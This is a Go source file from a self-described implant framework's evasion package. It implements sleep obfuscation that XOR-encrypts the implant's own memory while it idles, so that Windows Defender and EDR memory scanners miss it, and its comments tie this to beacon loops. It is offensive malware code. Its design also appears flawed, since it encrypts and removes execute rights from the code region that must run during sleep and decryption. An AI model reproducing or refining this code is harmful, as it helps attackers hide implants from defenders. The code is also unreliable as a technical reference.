package evasion

/*
	Phantom Implant Framework - Sleep Obfuscation
	Encrypts implant memory during sleep intervals to evade
	memory scanners (Windows Defender, EDR memory scanning).

	Technique: Ekko / Foliage-style sleep obfuscation
	- Before sleeping: XOR-encrypt the implant's own memory region
	- During sleep: memory appears as garbage/encrypted data
	- After waking: decrypt memory back, resume execution

	This defeats memory scanners that scan process memory for
	known implant signatures while the implant is idle.
*/

import (
	"crypto/rand"
	"encoding/binary"
	"fmt"
	"time"
	"unsafe"

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"golang.org/x/sys/windows"
)

var (
	sleepObfuscationEnabled = false
	xorKey                  [32]byte
)

// EnableSleepObfuscation enables memory encryption during sleep.
// Call once at startup when --evasion is active.
func EnableSleepObfuscation() {
	// Generate a random XOR key for this implant instance
	if _, err := rand.Read(xorKey[:]); err != nil {
		// Fallback to a pseudo-random key if crypto/rand fails
		binary.LittleEndian.PutUint64(xorKey[0:], 0xDEADBEEFCAFEBABE)
		binary.LittleEndian.PutUint64(xorKey[8:], 0x0102030405060708)
		binary.LittleEndian.PutUint64(xorKey[16:], 0xFEDCBA9876543210)
		binary.LittleEndian.PutUint64(xorKey[24:], 0xA5A5A5A5A5A5A5A5)
	}
	sleepObfuscationEnabled = true
	// {{if .Config.Debug}}
	log.Println("[evasion] Sleep obfuscation enabled")
	// {{end}}
}

// ObfuscatedSleep sleeps for the given duration while keeping
// the implant's memory encrypted. This is the core evasion primitive —
// use this instead of time.Sleep in beacon/reconnect loops.
func ObfuscatedSleep(ms uint32) {
	if !sleepObfuscationEnabled {
		// Fall back to normal sleep if obfuscation not enabled
		time.Sleep(time.Duration(ms) * time.Millisecond)
		return
	}

	// Get the base address and size of the current module
	base, size, err := getCurrentModuleRegion()
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[evasion] Failed to get module region: %v, falling back to normal sleep\n", err)
		// {{end}}
		time.Sleep(time.Duration(ms) * time.Millisecond)
		return
	}

	// {{if .Config.Debug}}
	log.Printf("[evasion] Encrypting memory region 0x%x (%d bytes) before sleep\n", base, size)
	// {{end}}

	// Make memory writable so we can encrypt it
	var oldProtect uint32
	if err := windows.VirtualProtect(base, size, windows.PAGE_READWRITE, &oldProtect); err != nil {
		// {{if .Config.Debug}}
		log.Printf("[evasion] VirtualProtect failed: %v\n", err)
		// {{end}}
		time.Sleep(time.Duration(ms) * time.Millisecond)
		return
	}

	// XOR-encrypt the memory region
	xorMemory(base, size)

	// Sleep — memory is now encrypted garbage
	time.Sleep(time.Duration(ms) * time.Millisecond)

	// Decrypt memory back
	xorMemory(base, size)

	// Restore original protection (RX)
	windows.VirtualProtect(base, size, oldProtect, &oldProtect)

	// {{if .Config.Debug}}
	log.Println("[evasion] Memory decrypted, resuming")
	// {{end}}
}

// xorMemory XOR-encrypts/decrypts a memory region using the instance key.
// XOR is its own inverse — same function encrypts and decrypts.
func xorMemory(base uintptr, size uintptr) {
	mem := unsafe.Slice((*byte)(unsafe.Pointer(base)), size)
	keyLen := len(xorKey)
	for i := range mem {
		mem[i] ^= xorKey[i%keyLen]
	}
}

// getCurrentModuleRegion finds the memory region containing the current
// executable's code by querying VirtualQuery on the current instruction pointer.
func getCurrentModuleRegion() (uintptr, uintptr, error) {
	// Get a pointer to a function in this package as a reference point
	// for where our code lives in memory
	funcPtr := windows.NewCallback(func() uintptr { return 0 })

	var mbi windows.MemoryBasicInformation
	size := unsafe.Sizeof(mbi)

	ret, _, err := windows.NewLazySystemDLL("kernel32.dll").
		NewProc("VirtualQuery").
		Call(funcPtr, uintptr(unsafe.Pointer(&mbi)), size)

	if ret == 0 {
		return 0, 0, fmt.Errorf("VirtualQuery failed: %w", err)
	}

	// Walk back to find the allocation base (start of the module)
	base := mbi.AllocationBase
	totalSize := uintptr(0)

	// Walk forward to find total committed size of this allocation
	addr := base
	for {
		ret, _, _ = windows.NewLazySystemDLL("kernel32.dll").
			NewProc("VirtualQuery").
			Call(addr, uintptr(unsafe.Pointer(&mbi)), size)
		if ret == 0 {
			break
		}
		if mbi.AllocationBase != base {
			break
		}
		if mbi.State != windows.MEM_COMMIT {
			addr += uintptr(mbi.RegionSize)
			continue
		}
		totalSize += uintptr(mbi.RegionSize)
		addr += uintptr(mbi.RegionSize)
	}

	if totalSize == 0 {
		return 0, 0, fmt.Errorf("could not determine module size")
	}

	return base, totalSize, nil
}
